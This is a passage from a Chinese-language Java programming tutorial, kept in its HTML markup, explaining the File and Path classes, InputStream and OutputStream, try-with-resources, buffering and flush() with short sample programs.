class="comment">// 根据当前平台打印"\"或"/"</span></span><br></pre></td></tr></table></figure><h3 id="文件和目录"><a href="#文件和目录" class="headerlink" title="文件和目录"></a>文件和目录</h3><p><code>File</code>对象既可以表示文件，也可以表示目录。特别要注意的是，构造一个<code>File</code>对象，即使传入的文件或目录不存在，代码也不会出错，因为构造一个<code>File</code>对象，并不会导致任何磁盘操作。只有当我们调用<code>File</code>对象的某些方法的时候，才真正进行磁盘操作。</p><p>例如，调用<code>isFile()</code>，判断该<code>File</code>对象是否是一个已存在的文件，调用<code>isDirectory()</code>，判断该<code>File</code>对象是否是一个已存在的目录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f1 = <span class="keyword">new</span> File(<span class="string">"C:\\Windows"</span>);</span><br><span class="line">        File f2 = <span class="keyword">new</span> File(<span class="string">"C:\\Windows\\notepad.exe"</span>);</span><br><span class="line">        File f3 = <span class="keyword">new</span> File(<span class="string">"C:\\Windows\\nothing"</span>);</span><br><span class="line">        System.out.println(f1.isFile());</span><br><span class="line">        System.out.println(f1.isDirectory());</span><br><span class="line">        System.out.println(f2.isFile());</span><br><span class="line">        System.out.println(f2.isDirectory());</span><br><span class="line">        System.out.println(f3.isFile());</span><br><span class="line">        System.out.println(f3.isDirectory());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>File</code>对象获取到一个文件时，还可以进一步判断文件的权限和大小：</p><ul><li><code>boolean canRead()</code>：是否可读；</li><li><code>boolean canWrite()</code>：是否可写；</li><li><code>boolean canExecute()</code>：是否可执行；</li><li><code>long length()</code>：文件字节大小。</li></ul><p>对目录而言，是否可执行表示能否列出它包含的文件和子目录。</p><h3 id="创建和删除文件"><a href="#创建和删除文件" class="headerlink" title="创建和删除文件"></a>创建和删除文件</h3><p>当File对象表示一个文件时，可以通过<code>createNewFile()</code>创建一个新文件，用<code>delete()</code>删除该文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">File file = <span class="keyword">new</span> File(<span class="string">"/path/to/file"</span>);</span><br><span class="line"><span class="keyword">if</span> (file.createNewFile()) &#123;</span><br><span class="line">    <span class="comment">// 文件创建成功:</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span></span></span><br><span class="line">    <span class="keyword">if</span> (file.delete()) &#123;</span><br><span class="line">        <span class="comment">// 删除文件成功:</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有些时候，程序需要读写一些临时文件，File对象提供了<code>createTempFile()</code>来创建一个临时文件，以及<code>deleteOnExit()</code>在JVM退出时自动删除该文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f = File.createTempFile(<span class="string">"tmp-"</span>, <span class="string">".txt"</span>); <span class="comment">// 提供临时文件的前缀和后缀</span></span><br><span class="line">        f.deleteOnExit(); <span class="comment">// JVM退出时自动删除</span></span><br><span class="line">        System.out.println(f.isFile());</span><br><span class="line">        System.out.println(f.getAbsolutePath());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="遍历文件和目录"><a href="#遍历文件和目录" class="headerlink" title="遍历文件和目录"></a>遍历文件和目录</h3><p>当File对象表示一个目录时，可以使用<code>list()</code>和<code>listFiles()</code>列出目录下的文件和子目录名。<code>listFiles()</code>提供了一系列重载方法，可以过滤不想要的文件和目录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"C:\\Windows"</span>);</span><br><span class="line">        File[] fs1 = f.listFiles(); <span class="comment">// 列出所有文件和子目录</span></span><br><span class="line">        printFiles(fs1);</span><br><span class="line">        File[] fs2 = f.listFiles(<span class="keyword">new</span> FilenameFilter() &#123; <span class="comment">// 仅列出.exe文件</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">accept</span><span class="params">(File dir, String name)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> name.endsWith(<span class="string">".exe"</span>); <span class="comment">// 返回true表示接受该文件</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        printFiles(fs2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printFiles</span><span class="params">(File[] files)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"=========="</span>);</span><br><span class="line">        <span class="keyword">if</span> (files != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (File f : files) &#123;</span><br><span class="line">                System.out.println(f);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"=========="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和文件操作类似，File对象如果表示一个目录，可以通过以下方法创建和删除目录：</p><ul><li><code>boolean mkdir()</code>：创建当前File对象表示的目录；</li><li><code>boolean mkdirs()</code>：创建当前File对象表示的目录，并在必要时将不存在的父目录也创建出来；</li><li><code>boolean delete()</code>：删除当前File对象表示的目录，当前目录必须为空才能删除成功。</li></ul><h3 id="Path"><a href="#Path" class="headerlink" title="Path"></a>Path</h3><p>Java标准库还提供了一个<code>Path</code>对象，它位于<code>java.nio.file</code>包。<code>Path</code>对象和<code>File</code>对象类似，但操作更加简单：</p><p><code>import java.io.*;</code></p><p><code>import java.nio.file.*;</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Path p1 = Paths.get(<span class="string">"."</span>, <span class="string">"project"</span>, <span class="string">"study"</span>); <span class="comment">// 构造一个Path对象</span></span><br><span class="line">        System.out.println(p1);<span class="comment">////.\project\study</span></span><br><span class="line">        Path p2 = p1.toAbsolutePath(); <span class="comment">// 转换为绝对路径</span></span><br><span class="line">        System.out.println(p2);<span class="comment">////D:\project\login\.\project\study</span></span><br><span class="line">        Path p3 = p2.normalize(); <span class="comment">// 转换为规范路径</span></span><br><span class="line">        System.out.println(p3);<span class="comment">////D:\project\login\project\study</span></span><br><span class="line">        File f = p3.toFile(); <span class="comment">// 转换为File对象</span></span><br><span class="line">        System.out.println(f);<span class="comment">////D:\project\login\project\study</span></span><br><span class="line">        <span class="keyword">for</span> (Path p : Paths.get(<span class="string">".."</span>).toAbsolutePath()) &#123; <span class="comment">// 可以直接遍历Path</span></span><br><span class="line">            System.out.println(<span class="string">"  "</span> + p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果需要对目录进行复杂的拼接、遍历等操作，使用<code>Path</code>对象更方便。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>Java标准库的<code>java.io.File</code>对象表示一个文件或者目录：</p><ul><li>创建<code>File</code>对象本身不涉及IO操作；</li><li>可以获取路径／绝对路径／规范路径：<code>getPath()</code>/<code>getAbsolutePath()</code>/<code>getCanonicalPath()</code>；</li><li>可以获取目录的文件和子目录：<code>list()</code>/<code>listFiles()</code>；</li><li>可以创建或删除文件和目录。</li></ul><h1 id="InputStream"><a href="#InputStream" class="headerlink" title="InputStream"></a>InputStream</h1><p><code>InputStream</code>就是Java标准库提供的最基本的输入流。它位于<code>java.io</code>这个包里。<code>java.io</code>包提供了所有同步IO的功能。</p><p>要特别注意的一点是，<code>InputStream</code>并不是一个接口，而是一个抽象类，它是所有输入流的超类。这个抽象类定义的一个最重要的方法就是<code>int read()</code>，签名如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public abstract int read() throws IOException;</span><br></pre></td></tr></table></figure><p>这个方法会读取输入流的下一个字节，并返回字节表示的<code>int</code>值（0~255）。如果已读到末尾，返回<code>-1</code>表示不能继续读取了。</p><p><code>FileInputStream</code>是<code>InputStream</code>的一个子类。顾名思义，<code>FileInputStream</code>就是从文件流中读取数据。下面的代码演示了如何完整地读取一个<code>FileInputStream</code>的所有字节：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">readFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个FileInputStream对象:</span></span><br><span class="line">    InputStream input = <span class="keyword">new</span> FileInputStream(<span class="string">"src/readme.txt"</span>);</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = input.read(); <span class="comment">// 反复调用read()方法，直到返回-1</span></span><br><span class="line">        <span class="keyword">if</span> (n == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(n); <span class="comment">// 打印byte的值</span></span><br><span class="line">    &#125;</span><br><span class="line">    input.close(); <span class="comment">// 关闭流</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在计算机中，类似文件、网络端口这些资源，都是由操作系统统一管理的。应用程序在运行的过程中，如果打开了一个文件进行读写，完成后要及时地关闭，以便让操作系统把资源释放掉，否则，应用程序占用的资源会越来越多，不但白白占用内存，还会影响其他应用程序的运行。</p><p><code>InputStream</code>和<code>OutputStream</code>都是通过<code>close()</code>方法来关闭流。关闭流就会释放对应的底层资源。</p><p>我们还要注意到在读取或写入IO流的过程中，可能会发生错误，例如，文件不存在导致无法读取，没有写权限导致写入失败，等等，这些底层错误由Java虚拟机自动封装成<code>IOException</code>异常并抛出。因此，所有与IO操作相关的代码都必须正确处理<code>IOException</code>。</p><p>仔细观察上面的代码，会发现一个潜在的问题：如果读取过程中发生了IO错误，<code>InputStream</code>就没法正确地关闭，资源也就没法及时释放。</p><p>因此，我们需要用<code>try ... finally</code>来保证<code>InputStream</code>在无论是否发生IO错误的时候都能够正确地关闭：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void readFile() throws IOException &#123;</span><br><span class="line">    InputStream input &#x3D; null;</span><br><span class="line">    try &#123;</span><br><span class="line">        input &#x3D; new FileInputStream(&quot;src&#x2F;readme.txt&quot;);</span><br><span class="line">        int n;</span><br><span class="line">        while ((n &#x3D; input.read()) !&#x3D; -1) &#123; &#x2F;&#x2F; 利用while同时读取并判断</span><br><span class="line">            System.out.println(n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        if (input !&#x3D; null) &#123; input.close(); &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>try ... finally</code>来编写上述代码会感觉比较复杂，更好的写法是利用Java 7引入的新的<code>try(resource)</code>的语法，只需要编写<code>try</code>语句，让编译器自动为我们关闭资源。推荐的写法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public void readFile() throws IOException &#123;</span><br><span class="line">    try (InputStream input &#x3D; new FileInputStream(&quot;src&#x2F;readme.txt&quot;)) &#123;</span><br><span class="line">        int n;</span><br><span class="line">        while ((n &#x3D; input.read()) !&#x3D; -1) &#123;</span><br><span class="line">            System.out.println(n);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; &#x2F;&#x2F; 编译器在此自动为我们写入finally并调用close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上，编译器并不会特别地为<code>InputStream</code>加上自动关闭。编译器只看<code>try(resource = ...)</code>中的对象是否实现了<code>java.lang.AutoCloseable</code>接口，如果实现了，就自动加上<code>finally</code>语句并调用<code>close()</code>方法。<code>InputStream</code>和<code>OutputStream</code>都实现了这个接口，因此，都可以用在<code>try(resource)</code>中。</p><h3 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h3><p>在读取流的时候，一次读取一个字节并不是最高效的方法。很多流支持一次性读取多个字节到缓冲区，对于文件和网络流来说，利用缓冲区一次性读取多个字节效率往往要高很多。<code>InputStream</code>提供了两个重载方法来支持读取多个字节：</p><ul><li><code>int read(byte[] b)</code>：读取若干字节并填充到<code>byte[]</code>数组，返回读取的字节数</li><li><code>int read(byte[] b, int off, int len)</code>：指定<code>byte[]</code>数组的偏移量和最大填充数</li></ul><p>利用上述方法一次读取多个字节时，需要先定义一个<code>byte[]</code>数组作为缓冲区，<code>read()</code>方法会尽可能多地读取字节到缓冲区， 但不会超过缓冲区的大小。<code>read()</code>方法的返回值不再是字节的<code>int</code>值，而是返回实际读取了多少个字节。如果返回<code>-1</code>，表示没有更多的数据了。</p><p>利用缓冲区一次读取多个字节的代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public void readFile() throws IOException &#123;</span><br><span class="line">    try (InputStream input &#x3D; new FileInputStream(&quot;src&#x2F;readme.txt&quot;)) &#123;</span><br><span class="line">        &#x2F;&#x2F; 定义1000个字节大小的缓冲区:</span><br><span class="line">        byte[] buffer &#x3D; new byte[1000];</span><br><span class="line">        int n;</span><br><span class="line">        while ((n &#x3D; input.read(buffer)) !&#x3D; -1) &#123; &#x2F;&#x2F; 读取到缓冲区</span><br><span class="line">            System.out.println(&quot;read &quot; + n + &quot; bytes.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="阻塞"><a href="#阻塞" class="headerlink" title="阻塞"></a>阻塞</h3><p>在调用<code>InputStream</code>的<code>read()</code>方法读取数据时，我们说<code>read()</code>方法是阻塞（Blocking）的。它的意思是，对于下面的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int n;</span><br><span class="line">n &#x3D; input.read(); &#x2F;&#x2F; 必须等待read()方法返回才能执行下一行代码</span><br><span class="line">int m &#x3D; n;</span><br></pre></td></tr></table></figure><p>执行到第二行代码时，必须等<code>read()</code>方法返回后才能继续。因为读取IO流相比执行普通代码，速度会慢很多，因此，无法确定<code>read()</code>方法调用到底要花费多长时间。</p><h3 id="InputStream实现类"><a href="#InputStream实现类" class="headerlink" title="InputStream实现类"></a>InputStream实现类</h3><p>用<code>FileInputStream</code>可以从文件获取输入流，这是<code>InputStream</code>常用的一个实现类。此外，<code>ByteArrayInputStream</code>可以在内存中模拟一个<code>InputStream</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*; </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data = &#123; <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">33</span> &#125;;</span><br><span class="line">        <span class="keyword">try</span> (InputStream input = <span class="keyword">new</span> ByteArrayInputStream(data)) &#123;</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="keyword">while</span> ((n = input.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println((<span class="keyword">char</span>)n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ByteArrayInputStream</code>实际上是把一个<code>byte[]</code>数组在内存中变成一个<code>InputStream</code>，虽然实际应用不多，但测试的时候，可以用它来构造一个<code>InputStream</code>。</p><p>举个栗子：我们想从文件中读取所有字节，并转换成<code>char</code>然后拼成一个字符串，可以这么写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String s;</span><br><span class="line">        <span class="keyword">try</span> (InputStream input = <span class="keyword">new</span> FileInputStream(<span class="string">"C:\\test\\README.txt"</span>)) &#123;</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">while</span> ((n = input.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                sb.append((<span class="keyword">char</span>) n);</span><br><span class="line">            &#125;</span><br><span class="line">            s = sb.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要测试上面的程序，就真的需要在本地硬盘上放一个真实的文本文件。如果我们把代码稍微改造一下，提取一个<code>readAsString()</code>的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String s;</span><br><span class="line">        <span class="keyword">try</span> (InputStream input = <span class="keyword">new</span> FileInputStream(<span class="string">"C:\\test\\README.txt"</span>)) &#123;</span><br><span class="line">            s = readAsString(input);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readAsString</span><span class="params">(InputStream input)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> ((n = input.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">            sb.append((<span class="keyword">char</span>) n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对这个<code>String readAsString(InputStream input)</code>方法进行测试就相当简单，因为不一定要传入一个真的<code>FileInputStream</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data = &#123; <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">33</span> &#125;;</span><br><span class="line">        <span class="keyword">try</span> (InputStream input = <span class="keyword">new</span> ByteArrayInputStream(data)) &#123;</span><br><span class="line">            String s = readAsString(input);</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readAsString</span><span class="params">(InputStream input)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">while</span> ((n = input.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">            sb.append((<span class="keyword">char</span>) n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是面向抽象编程原则的应用：接受<code>InputStream</code>抽象类型，而不是具体的<code>FileInputStream</code>类型，从而使得代码可以处理<code>InputStream</code>的任意实现类。</p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>Java标准库的<code>java.io.InputStream</code>定义了所有输入流的超类：</p><ul><li><code>FileInputStream</code>实现了文件流输入；</li><li><code>ByteArrayInputStream</code>在内存中模拟一个字节流输入。</li></ul><p>总是使用<code>try(resource)</code>来保证<code>InputStream</code>正确关闭。</p><h1 id="OutputStream"><a href="#OutputStream" class="headerlink" title="OutputStream"></a>OutputStream</h1><p>和<code>InputStream</code>相反，<code>OutputStream</code>是Java标准库提供的最基本的输出流。</p><p>和<code>InputStream</code>类似，<code>OutputStream</code>也是抽象类，它是所有输出流的超类。这个抽象类定义的一个最重要的方法就是<code>void write(int b)</code>，签名如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public abstract void write(int b) throws IOException;</span><br></pre></td></tr></table></figure><p>这个方法会写入一个字节到输出流。要注意的是，虽然传入的是<code>int</code>参数，但只会写入一个字节，即只写入<code>int</code>最低8位表示字节的部分（相当于<code>b &amp; 0xff</code>）。</p><p>和<code>InputStream</code>类似，<code>OutputStream</code>也提供了<code>close()</code>方法关闭输出流，以便释放系统资源。要特别注意：<code>OutputStream</code>还提供了一个<code>flush()</code>方法，它的目的是将缓冲区的内容真正输出到目的地。</p><p>为什么要有<code>flush()</code>？因为向磁盘、网络写入数据的时候，出于效率的考虑，操作系统并不是输出一个字节就立刻写入到文件或者发送到网络，而是把输出的字节先放到内存的一个缓冲区里（本质上就是一个<code>byte[]</code>数组），等到缓冲区写满了，再一次性写入文件或者网络。对于很多IO设备来说，一次写一个字节和一次写1000个字节，花费的时间几乎是完全一样的，所以<code>OutputStream</code>有个<code>flush()</code>方法，能强制把缓冲区内容输出。</p><p>通常情况下，我们不需要调用这个<code>flush()</code>方法，因为缓冲区写满了<code>OutputStream</code>会自动调用它，并且，在调用<code>close()</code>方法关闭<code>OutputStream</code>之前，也会自动调用<code>flush()</code>方法。</p><p>但是，在某些情况下，我们必须手动调用<code>flush()</code>方法。举个栗子：</p><p>小明正在开发一款在线聊天软件，当用户输入一句话后，就通过<code>OutputStream</code>的<code>write()</code>方法写入网络流。小明测试的时候发现，发送方输入后，接收方根本收不到任何信息，怎么肥四？</p><p>原因就在于写入网络流是先写入内存缓冲区，等缓冲区满了才会一次性发送到网络。如果缓冲区大小是4K，则发送方要敲几千个字符后，操作系统才会把缓冲区的内容发送出去，这个时候，接收方会一次性收到大量消息。</p><p>解决办法就是每输入一句话后，立刻调用<code>flush()</code>，不管当前缓冲区是否已满，强迫操作系统把缓冲区的内容立刻发送出去。</p><p>实际上，<code>InputStream</code>也有缓冲区。例如，从<code>FileInputStream</code>读取一个字节时，操作系统往往会一次性读取若干字节到缓冲区，并维护一个指针指向未读的缓冲区。然后，每次我们调用<code>int read()</code>读取下一个字节时，可以直接返回缓冲区的下一个字节，避免每次读一个字节都导致IO操作。当缓冲区全部读完后继续调用<code>read()</code>，则会触发操作系统的下一次读取并再次填满缓冲区。</p><h3 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h3><p>我们以<code>FileOutputStream</code>为例，演示如何将若干个字节写入文件流：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public void writeFile() throws IOException &#123;</span><br><span class="line">    OutputStream output &#x3D; new FileOutputStream(&quot;out&#x2F;readme.txt&quot;);</span><br><span class="line">    output.write(72); &#x2F;&#x2F; H</span><br><span class="line">    output.write(101); &#x2F;&#x2F; e</span><br><span class="line">    output.write(108); &#x2F;&#x2F; l</span><br><span class="line">    output.write(108); &#x2F;&#x2F; l</span><br><span class="line">    output.write(111); &#x2F;&#x2F; o</span><br><span class="line">    output.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次写入一个字节非常麻烦，更常见的方法是一次性写入若干字节。这时，可以用<code>OutputStream</code>提供的重载方法<code>void write(byte[])</code>来实现：</p><figure 